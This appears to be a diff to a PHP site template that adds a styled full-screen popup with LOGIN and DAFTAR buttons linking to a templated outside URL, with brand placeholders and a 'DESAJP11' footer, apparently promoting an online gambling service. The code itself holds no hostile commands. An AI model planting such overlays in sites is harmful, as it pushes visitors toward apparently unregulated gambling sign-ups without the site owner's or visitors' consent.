+    background:linear-gradient(90deg,transparent,#ff8d8d,#ff2d2d,transparent);
+    opacity:.9;
+  }
+
+  .clk-btn-sgp a{
+    position:relative;
+    overflow:hidden;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:54px;
+    padding:15px 12px;
+    border-radius:16px;
+    text-decoration:none;
+    text-transform:uppercase;
+    letter-spacing:1.4px;
+    font-size:15px;
+    isolation:isolate;
+    transition:.28s ease;
+    box-shadow:0 12px 24px rgba(0,0,0,.38);
+  }
+
+  .clk-btn-sgp a:before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:linear-gradient(120deg,transparent 30%,rgba(255,255,255,.25),transparent 70%);
+    transform:translateX(-120%);
+    transition:.45s ease;
+    z-index:-1;
+  }
+
+  .clk-btn-sgp a:hover:before{
+    transform:translateX(120%);
+  }
+
+  .clk-btn-sgp a:hover{
+    transform:translateY(-5px);
+  }
+
+  .login{
+    color:#ffb0b0!important;
+    background:linear-gradient(145deg,#240303,#100101);
+    border:1px solid rgba(255,65,65,.78);
+  }
+
+  .login:hover{
+    color:#fff!important;
+    border-color:#ff3030;
+    box-shadow:
+      0 16px 28px rgba(0,0,0,.45),
+      0 0 24px rgba(255,35,35,.38);
+  }
+
+  .register{
+    color:#ffffff!important;
+    background:linear-gradient(145deg,#ff8d8d,#ff2d2d,#8b0000);
+    border:1px solid rgba(255,255,255,.18);
+  }
+
+  .register:hover{
+    color:#ffffff!important;
+    box-shadow:
+      0 16px 28px rgba(0,0,0,.45),
+      0 0 28px rgba(255,30,30,.52);
+  }
+
+  .popup-footer{
+    position:relative;
+    z-index:7;
+    margin:8px 18px 20px;
+    padding:16px 14px;
+    border-radius:18px;
+    color:#ffe4e4;
+    font-size:13px;
+    line-height:1.65;
+    background:rgba(255,255,255,.04);
+    border:1px solid rgba(255,80,80,.14);
+    box-shadow:0 10px 22px rgba(0,0,0,.25) inset;
+  }
+
+  .popup-footer span{
+    color:#ff9b9b!important;
+    font-weight:800!important;
+    text-shadow:0 0 15px rgba(255,35,35,.62)!important;
+  }
+
+  @media(max-width:480px){
+    .popup-overlay{
+      padding:12px;
+    }
+
+    .popup-container{
+      width:95vw;
+      border-radius:22px;
+    }
+
+    .popup-container:before{
+      inset:9px;
+      border-radius:18px;
+    }
+
+    .clk-btn-sgp{
+      grid-template-columns:1fr;
+      padding:15px 15px 8px;
+      gap:10px;
+    }
+
+    .clk-btn-sgp a{
+      min-height:50px;
+      font-size:14px;
+    }
+
+    .popup-footer{
+      margin:8px 15px 17px;
+      font-size:12px;
+    }
+
+    .close-btn{
+      width:31px;
+      height:31px;
+      top:11px;
+      right:11px;
+    }
+  }
+</style>
+
+
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-container">
+    <div class="close-btn" onclick="closePopup()"></div>
+
+    <div class="gold-particle" style="top:14%;left:13%;animation-delay:0s;"></div>
+    <div class="gold-particle" style="top:30%;left:88%;animation-delay:1.2s;"></div>
+    <div class="gold-particle" style="top:62%;left:16%;animation-delay:2.4s;"></div>
+    <div class="gold-particle" style="top:22%;left:72%;animation-delay:3.6s;"></div>
+    <div class="gold-particle" style="top:82%;left:58%;animation-delay:4.8s;"></div>
+
+    <div class="luxury-border"></div>
+
+    <div class="Game Digital Yang Setiap">
+      <img src="<?= $image; ?>" alt="Popup Banner" class="popup-image" />
+
+      <div class="clk-btn-sgp" style="font-size:20px;">
+        <a href="<?= $ampmek; ?>" target="_blank" rel="nofollow noreferrer" class="login">LOGIN</a>
+        <a href="<?= $ampmek; ?>" target="_blank" rel="nofollow noreferrer" class="register">DAFTAR</a>
+      </div>
+
+      <div class="popup-footer">
+        <?= $title; ?><br/>
+        <span style="color:#6a994e;font-weight:600;text-shadow:0 0 5px rgba(106,153,78,.5);">&copy; COPYRIGHT 2026 | <?= $BRAND; ?> x <?= $BRAND2; ?> | DESAJP11</span>
       </div>
     </div>
   </div>
-  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"4215a4ae3292400caeca327329a9ac1a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"9c98a51ecaaa4159a8ee02f795e229f5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"66e2f3ff922b42cf96fba1fc9deab898","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-  </body>
-  </html>
+</div>
+<script>
+    function closePopup() {
+        const popupOverlay = document.getElementById('popupOverlay');
+        popupOverlay.style.opacity = '0';
+        popupOverlay.style.transition = 'opacity 0.3s ease';
+        
+        setTimeout(() => {
+            popupOverlay.style.display = 'none';
+        }, 300);
+    }
+    
+    // Menutup popup ketika mengklik area di luar popup
+    document.getElementById('popupOverlay').addEventListener('click', function(event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    });
+</script>
+</div>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"06b9ec0ba3994847a8ccfa06f26cd684","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
